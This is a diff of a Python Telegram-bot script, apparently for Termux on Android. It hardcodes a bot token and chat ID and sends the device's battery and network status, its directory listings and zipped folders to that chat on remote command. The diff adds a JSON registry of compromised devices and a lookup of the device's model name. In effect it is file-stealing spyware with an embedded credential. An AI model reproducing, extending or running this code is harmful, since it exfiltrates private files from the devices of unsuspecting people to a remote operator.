@@ -1,13 +1,17 @@
 import sys
 import subprocess
 import os
-os.system('pip install telebot')
 import platform
 import hashlib
 import telebot
 import time
 import shutil
 from telebot.types import ReplyKeyboardMarkup, KeyboardButton
+import json
+
+# إعداد البوت باستخدام التوكن الخاص بك
+bot = telebot.TeleBot("7517544528:AAEwE_8hpzGDqaQyaNSBlRUHi0CZ-ptGn_o")
+chat_id = '5164991393'
 
 # قائمة المكتبات المطلوبة
 required_modules = ['telebot', 'pyfiglet', 'requests']
@@ -33,9 +37,34 @@ install_modules()
 import pyfiglet
 import requests
 
-# إعداد البوت باستخدام التوكن الخاص بك
-bot = telebot.TeleBot("7517544528:AAEwE_8hpzGDqaQyaNSBlRUHi0CZ-ptGn_o")
-chat_id = '5164991393'
+# حفظ قائمة الأجهزة المتصلة في ملف JSON
+devices_file = 'connected_devices.json'
+
+# تحميل أو إنشاء ملف بيانات الأجهزة
+def load_devices():
+    if os.path.exists(devices_file):
+        with open(devices_file, 'r') as f:
+            return json.load(f)
+    return {}
+
+# حفظ الأجهزة المتصلة في ملف JSON
+def save_devices(devices):
+    with open(devices_file, 'w') as f:
+        json.dump(devices, f, indent=4)
+
+# تحميل الأجهزة المتصلة
+connected_devices = load_devices()
+
+# تحديد اسم الجهاز الفعلي
+def get_device_name():
+    try:
+        if platform.system().lower() == "android":
+            device_name = subprocess.check_output(['getprop', 'ro.product.model']).decode().strip()
+        else:
+            device_name = platform.node()
+    except Exception:
+        device_name = "Unknown Device"
+    return device_name
 
 # طباعة رسالة الترحيب
 ab = pyfiglet.figlet_format("@termuxpp")
@@ -113,11 +142,17 @@ def gather_device_info(environment):
     return battery_status, network_status
 
 # عرض معلومات الجهاز واختيار الجهاز المتصل
-def handle_device_selection(environment, directory):
+def handle_device_selection(environment, directory, device_name):
     global current_directory
     current_directory = directory
     battery_status, network_status = gather_device_info(environment)
-    bot.send_message(chat_id=chat_id, text=f"تم اختيار {environment}.\nحالة البطارية: {battery_status}\nإشارة الشبكة: {network_status}.")
+
+    # حفظ الجهاز في قائمة الأجهزة المتصلة
+    if device_name not in connected_devices:
+        connected_devices[device_name] = {'environment': environment, 'directory': directory}
+        save_devices(connected_devices)
+
+    bot.send_message(chat_id=chat_id, text=f"تم اختيار {device_name} ({environment}).\nحالة البطارية: {battery_status}\nإشارة الشبكة: {network_status}.")
     list_files_in_directory(current_directory)
 
 # تخزين المسارات في قاموس لسهولة الوصول إليها لاحقًا
@@ -168,13 +203,27 @@ def compress_and_send_directory(dir_path):
         bot.send_document(chat_id=chat_id, document=f, caption=f'ملفات مضغوطة من: {dir_path}')
     os.remove(zip_file)
 
+# عرض الأجهزة المتصلة عند بدء التشغيل
+def show_connected_devices():
+    if connected_devices:
+        markup = ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
+        for device_name in connected_devices:
+            markup.add(KeyboardButton(device_name))
+        bot.send_message(chat_id=chat_id, text="الأجهزة المتصلة المتاحة:", reply_markup=markup)
+    else:
+        bot.send_message(chat_id=chat_id, text="لم يتم الاتصال بأي جهاز من قبل. سيتم الآن تحديد الجهاز الحالي.")
+
 # التعامل مع إدخال المسار من المستخدم
 @bot.message_handler(func=lambda message: True)
 def handle_file_selection(message):
     global current_directory
     selected = message.text.strip()
 
-    if selected.startswith("📂"):
+    # التحقق مما إذا كان الجهاز المحدد في قائمة الأجهزة المتصلة
+    if selected in connected_devices:
+        device_info = connected_devices[selected]
+        handle_device_selection(device_info['environment'], device_info['directory'], selected)
+    elif selected.startswith("📂"):
         new_dir = os.path.join(current_directory, selected[2:].strip())
         if os.path.isdir(new_dir):
             list_files_in_directory(new_dir)
@@ -198,6 +247,11 @@ def handle_file_selection(message):
         bot.send_message(chat_id=chat_id, text=f'📂 المسار {selected} غير موجود أو غير صالح.')
 
 # بدء البوت
+device_name = get_device_name()
 environment, directory = detect_environment()
-handle_device_selection(environment, directory)
+
+# عرض الأجهزة المتصلة عند بدء التشغيل
+show_connected_devices()
+
+handle_device_selection(environment, directory, device_name)
 bot.polling()
